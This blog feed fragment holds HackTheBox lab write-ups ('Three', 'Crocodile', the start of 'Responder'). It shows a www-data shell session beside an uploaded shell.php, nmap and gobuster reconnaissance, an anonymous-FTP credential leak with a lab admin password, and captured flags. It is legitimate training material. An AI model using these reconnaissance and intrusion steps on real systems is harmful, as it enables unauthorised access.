</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>bash: cannot <span style="color:#89dceb">set</span> terminal process group <span style="color:#89dceb;font-weight:bold">(</span>1541<span style="color:#89dceb;font-weight:bold">)</span>: Inappropriate ioctl <span style="color:#cba6f7">for</span> device
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>bash: no job control in this shell
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>www-data@three:/var/www/html$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>images
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>index.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>shell.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>www-data@three:/var/www/html$ <span style="color:#89dceb">cd</span> ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb">cd</span> ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>www-data@three:/var/www$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>www-data@three:/var/www$ cat flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>cat flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>a980d99281a28d638ac68b9bf9453c2b
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>www-data@three:/var/www$</span></span></code></pre></div>
<br>
<p><img src="image-8.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Crocodile</title>
      <link>http://localhost:1313/htb-crocodile/</link>
      <pubDate>Sat, 13 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-crocodile/</guid>
      <description>What Nmap scanning switch employs the use of default scripts during a scan? -sC What service version is found to be running on port 21? vsftpd 3.0.3 1(kalikali)-[~/Desktop] 2$ nmap -sC -sV 10.129.60.250 3Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-13 00:54 EDT 4Nmap scan report for 10.129.60.250 5Host is up (0.034s latency). 6Not shown: 998 closed tcp ports (conn-refused) 7PORT STATE SERVICE VERSION 821/tcp open ftp vsftpd 3.0.3 9| ftp-syst: 10| STAT: 11| FTP server status: 12| Connected to ::ffff:10.</description>
      <content:encoded><![CDATA[<h4 id="what-nmap-scanning-switch-employs-the-use-of-default-scripts-during-a-scan">What Nmap scanning switch employs the use of default scripts during a scan?</h4>






<pre tabindex="0"><code>-sC</code></pre>
<br>
<h4 id="what-service-version-is-found-to-be-running-on-port-21">What service version is found to be running on port 21?</h4>






<pre tabindex="0"><code>vsftpd 3.0.3</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ nmap -sC -sV 10.129.60.250
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-07-13 00:54 EDT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.60.250
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.034s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">998</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>conn-refused<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>21/tcp open  ftp     vsftpd 3.0.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>| ftp-syst:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>|   STAT:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>| FTP server status:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>|      Connected to ::ffff:10.10.14.28
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>|      Logged in as ftp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>|      TYPE: ASCII
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>|      No session bandwidth limit
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>|      Session timeout in seconds is <span style="color:#fab387">300</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>|      Control connection is plain text
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>|      Data connections will be plain text
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>|      At session startup, client count was <span style="color:#fab387">1</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>|      vsFTPd 3.0.3 - secure, fast, stable
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>|_End of status
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#89dceb;font-weight:bold">(</span>FTP code 230<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>| -rw-r--r--    <span style="color:#fab387">1</span> ftp      ftp            <span style="color:#fab387">33</span> Jun <span style="color:#fab387">08</span>  <span style="color:#fab387">2021</span> allowed.userlist
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>|_-rw-r--r--    <span style="color:#fab387">1</span> ftp      ftp            <span style="color:#fab387">62</span> Apr <span style="color:#fab387">20</span>  <span style="color:#fab387">2021</span> allowed.userlist.passwd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>80/tcp open  http    Apache httpd 2.4.41 <span style="color:#89dceb;font-weight:bold">((</span>Ubuntu<span style="color:#89dceb;font-weight:bold">))</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>|_http-title: Smash - Bootstrap Business Template
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>|_http-server-header: Apache/2.4.41 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>Service Info: OS: Unix
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 8.08 seconds</span></span></code></pre></div>
<br>
<h4 id="what-ftp-code-is-returned-to-us-for-the-anonymous-ftp-login-allowed-message">What FTP code is returned to us for the &ldquo;Anonymous FTP login allowed message?&rdquo;</h4>






<pre tabindex="0"><code>230</code></pre>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<h4 id="after-connecting-to-the-ftp-server-using-the-ftp-client-what-username-do-we-provide-when-prompted-to-log-in-anonymously">After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?</h4>






<pre tabindex="0"><code>anonymous</code></pre>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<h4 id="after-connecting-to-the-ftp-server-anonymously-what-command-can-we-use-to-download-the-files-we-find-on-the-ftp-server">After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?</h4>






<pre tabindex="0"><code>get</code></pre>
<p><img src="image-2.png#center" alt="alt text"></p>
<br>
<h4 id="what-is-one-of-the-higher-privilege-sounding-usernames-in-alloweduserlist-that-we-download-from-the-ftp-server">What is one of the higher-privilege sounding usernames in <code>allowed.userlist</code> that we download from the FTP server?</h4>






<pre tabindex="0"><code>admin</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>allowed.userlist  allowed.userlist.passwd  hash-id.py  ntlm_1605054722641.txt  openvpn  pico
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>$ cat allowed.userlist
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>aron
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>pwnmeow
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>egotisticalsw
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>admin</span></span></code></pre></div>
<br>
<h4 id="what-version-of-apache-http-server-is-running-on-the-target-host">What version of Apache HTTP Server is running on the target host?</h4>






<pre tabindex="0"><code>Apache httpd 2.4.41</code></pre>
<p><img src="image-3.png#center" alt="alt text"></p>
<br>
<h4 id="what-switch-can-we-use-with-gobuster-to-specify-we-are-looking-for-specific-filetypes">What switch can we use with Gobuster to specify we are looking for specific filetypes?</h4>






<pre tabindex="0"><code>-x</code></pre>
<p><code>gobuster dir --help</code> revealed the <code>-x</code> option.</p>
<p><img src="image-4.png#center" alt="alt text"></p>
<br>
<h4 id="which-php-file-can-we-identify-with-directory-brute-force-that-will-provide-the-opportunity-to-authenticate-to-the-web-service">Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?</h4>






<pre tabindex="0"><code>login.php</code></pre>
<p>The following command revealed PHP files with dirbuster on the target host.
<code>gobuster dir -u http://10.129.60.250 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php</code></p>
<p><code>-u</code>: url</p>
<p><code>-w</code>: wordlist</p>
<p><code>-x</code>: file types to look for</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ gobuster dir -u http://10.129.60.250 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x <span style="color:#f5e0dc">php</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Gobuster v3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>by OJ Reeves <span style="color:#89dceb;font-weight:bold">(</span>@TheColonial<span style="color:#89dceb;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#89dceb;font-weight:bold">(</span>@firefart<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Url: http://10.129.60.250
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Method: GET
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Threads: <span style="color:#fab387">10</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Negative Status codes: <span style="color:#fab387">404</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> User Agent: gobuster/3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Extensions: php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Timeout: <span style="color:#f5e0dc">10s</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>Starting gobuster in directory enumeration <span style="color:#f5e0dc">mode</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>/.php <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 278<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>/login.php <span style="color:#89dceb;font-weight:bold">(</span>Status: 200<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 1577<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>/assets <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 315<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://10.129.60.250/assets/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>/css <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 312<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://10.129.60.250/css/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>/js <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 311<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://10.129.60.250/js/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>/logout.php <span style="color:#89dceb;font-weight:bold">(</span>Status: 302<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 0<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; login.php<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>/config.php <span style="color:#89dceb;font-weight:bold">(</span>Status: 200<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 0<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>/fonts <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 314<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://10.129.60.250/fonts/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>/dashboard <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 318<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://10.129.60.250/dashboard/<span style="color:#89dceb;font-weight:bold">]</span></span></span></code></pre></div>
<br>
<h4 id="submit-root-flag">Submit root flag</h4>






<pre tabindex="0"><code>c7110277ac44d78b6a9fff2232434d16</code></pre>
<p>From the earlier task, we downloaded two files from the ftp server:</p>
<ol>
<li><strong><em>allowed.userlist</em></strong></li>
<li><strong><em>allowed.userlist.passwd</em></strong></li>
</ol>
<p>and we confirmed there was the username, <code>admin</code>. As you can see from the passwd file, the password for <code>admin</code> is <code>rKXM59ESxesUFHAd</code>.</p>
<p><img src="image-6.png#center" alt="alt text"></p>
<p><img src="image-7.png#center" alt="alt text"></p>
<br>
<p>From the gobuster output, we revealed there was <code>/login.php</code> page, so I navigated to the page and entered the credentials we had found from the ftp server and finally found the flag.</p>
<p><img src="image-5.png#center" alt="alt text"></p>
<p><img src="image-8.png#center" alt="alt text"></p>
<br>
<p><img src="image-9.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Responder</title>
      <link>http://localhost:1313/htb-responder/</link>
      <pubDate>Sat, 13 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-responder/</guid>
      <description>When visiting the web service using the IP address, what is the domain that we are being redirected to? unika.htb The website has redirected the browser to a new URL, and my host doesn&amp;rsquo;t know how to find unika.htb. This webserver is employing name-based Virtual Hosting for serving the requests.
Name-Based Virtual Hosting is a method for hosting multiple domain names on a single server. The web server checks the domain name provided in the Host header field of the HTTP request and sends a response according to that.</description>
      <content:encoded><![CDATA[<h4 id="when-visiting-the-web-service-using-the-ip-address-what-is-the-domain-that-we-are-being-redirected-to">When visiting the web service using the IP address, what is the domain that we are being redirected to?</h4>






<pre tabindex="0"><code>unika.htb</code></pre>
<p>The website has redirected the browser to a new URL, and my host doesn&rsquo;t know how to find <code>unika.htb</code>. This webserver is employing name-based Virtual Hosting for serving the requests.</p>
<p><code>Name-Based Virtual Hosting</code> is a method for hosting multiple domain names on a single server. The web server checks the domain name provided in the <code>Host</code> header field of the HTTP request and sends a response according to that.</p>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<p>The <code>/etc/hosts</code> file is used to resolve a hostname into an IP address &amp; thus we will need to add an entry for this domain to enable the browser to resolve the address for <code>unika.htb</code>. That&rsquo;s why the screen is currently black showing nothing.</p>
<p>Entry in the <code>/etc/hosts</code> file:</p>
<p><code>echo &quot;10.129.172.140   unika.htb&quot; | sudo tee -a /etc/hosts</code></p>
<p><img src="image-2.png#center" alt="alt text"></p>
<br>
<p>After we had appended the entry, I refreshed the page and the website now showed everything properly.
<img src="image-3.png#center" alt="alt text"></p>
<br>
<h4 id="which-scripting-language-is-being-used-on-the-server-to-generate-webpages">Which scripting language is being used on the server to generate webpages?</h4>






<pre tabindex="0"><code>PHP</code></pre>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<h4 id="what-is-the-name-of-the-url-parameter-which-is-used-to-load-different-language-versions-of-the-webpage">What is the name of the URL parameter which is used to load different language versions of the webpage?</h4>






<pre tabindex="0"><code>page</code></pre>
<p><img src="image-4.png#center" alt="alt text"></p>
<br>
